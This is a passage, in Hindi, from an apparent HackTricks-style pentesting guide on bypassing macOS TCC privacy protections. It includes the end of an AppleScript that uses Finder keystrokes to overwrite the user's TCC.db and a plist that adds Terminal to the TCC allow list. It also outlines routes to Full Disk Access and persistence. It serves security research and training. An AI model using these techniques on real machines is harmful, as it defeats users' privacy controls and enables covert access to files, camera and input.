    keystroke "/tmp"
    delay 1
    keystroke return
    delay 1

    -- Select and copy the file
    keystroke "TCC.db"
    delay 1
    keystroke "c" using {command down}
    delay 1

    -- Resolve $HOME environment variable
    set homePath to system attribute "HOME"

    -- Navigate to the Desktop directory under $HOME
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke homePath & "/Library/Application Support/com.apple.TCC"
    delay 1
    keystroke return
    delay 1

    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
    keystroke "TCC.db"
    delay 1
    keystroke return
    delay 1
    key code 51 using {command down}
    delay 1

    -- Paste the file
    keystroke "v" using {command down}
end tell
EOF
```

### `kTCCServiceAccessibility` से FDA\*

इस पेज पर [**Accessibility permissions का दुरुपयोग करने वाले payloads**](macos-tcc-payloads.md#accessibility) देखें, जिनसे FDA\* तक privesc किया जा सकता है या, उदाहरण के लिए, keylogger चलाया जा सकता है।

### **Endpoint Security Client से FDA**

अगर आपके पास **`kTCCServiceEndpointSecurityClient`** है, तो आपके पास FDA है। बस।

### System Policy SysAdmin File से FDA

**`kTCCServiceSystemPolicySysAdminFiles`** किसी user का **`NFSHomeDirectory`** attribute **बदलने** की अनुमति देता है, जिससे उसका home folder बदल जाता है और इसलिए **TCC को bypass** किया जा सकता है।<sup>[[5]](#references)</sup>

### User TCC DB से FDA

अगर आपको **user TCC** database पर **write permissions** मिलती हैं, तो आप खुद को **`FDA`** permissions नहीं दे सकते; ऐसा केवल system database में मौजूद entry ही दे सकती है।

लेकिन आप खुद को **`Finder के लिए Automation rights`** दे सकते हैं और FDA\* तक पहुँचने के लिए पिछली technique का दुरुपयोग कर सकते हैं।

### **FDA से TCC permissions**

**Full Disk Access** का TCC नाम **`kTCCServiceSystemPolicyAllFiles`** है।

मुझे नहीं लगता कि यह असली privesc है, लेकिन शायद यह आपके काम आए: अगर आप FDA वाले किसी program को control करते हैं, तो आप **users के TCC database को modify करके खुद को कोई भी access दे सकते हैं**। यह persistence technique के रूप में उपयोगी हो सकता है, अगर आपको FDA permissions खोने का डर हो।

### **SIP Bypass से TCC Bypass**

system **TCC database** को **SIP** से सुरक्षित किया जाता है। इसी वजह से केवल **निर्दिष्ट entitlements वाले processes ही इसे modify कर सकते हैं**। इसलिए, अगर किसी attacker को किसी **file** पर **SIP bypass** मिल जाता है (यानी वह SIP से प्रतिबंधित file को modify कर सकता है), तो वह:

- TCC database की **protection हटा सकता है** और खुद को सभी TCC permissions दे सकता है। उदाहरण के लिए, वह इनमें से किसी भी file का दुरुपयोग कर सकता है:
  - TCC systems database
  - REG.db
  - MDMOverrides.plist

हालाँकि, **SIP bypass का इस्तेमाल करके TCC को bypass करने** का एक और तरीका है। `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` उन applications की allow list है जिन्हें TCC exception की ज़रूरत होती है। इसलिए, अगर कोई attacker इस file से **SIP protection हटा सके** और इसमें अपना **application** जोड़ सके, तो वह application TCC को bypass कर पाएगा।\
उदाहरण के लिए, terminal जोड़ने के लिए:

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

### TCC Bypasses


{{#ref}}
macos-tcc-bypasses/
{{#endref}}



## References

- [1] [macOS TCC.db की गहराई से पड़ताल - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - com.apple.macl को ट्रैक करने की script (brunerd का Gist)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [com.apple.macl को ट्रैक और नियंत्रित करना](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [macOS TCC की उपयोगकर्ता गोपनीयता सुरक्षा को गलती से और जानबूझकर Bypass करना](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [होम डायरेक्टरी बदलना और TCC को Bypass करना, यानी CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [6] [TCC में SQL Injection: और यह (शायद) इस बार सुरक्षा जोखिम क्यों नहीं था](https://wts.dev/posts/tcc-sql-injection/)
- [7] [macOS पर TCC.db का स्थान और अधिग्रहण](https://www.tccparser.com/en/blog/tcc-db-location-acquisition)
- [8] [macOS App Sandbox कॉन्फ़िगर करना](https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox)
- [9] [Camera entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.device.camera)
- [10] [Apple डिवाइस के लिए Privacy Preferences Policy Control device management payload सेटिंग्स](https://support.apple.com/guide/deployment/privacy-preferences-policy-control-payload-dep38df53c2a/web)
- [11] [macOS intrusion की पड़ताल: लालच से लेकर compromise तक](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)
{{#include ../../../../banners/hacktricks-training.md}}
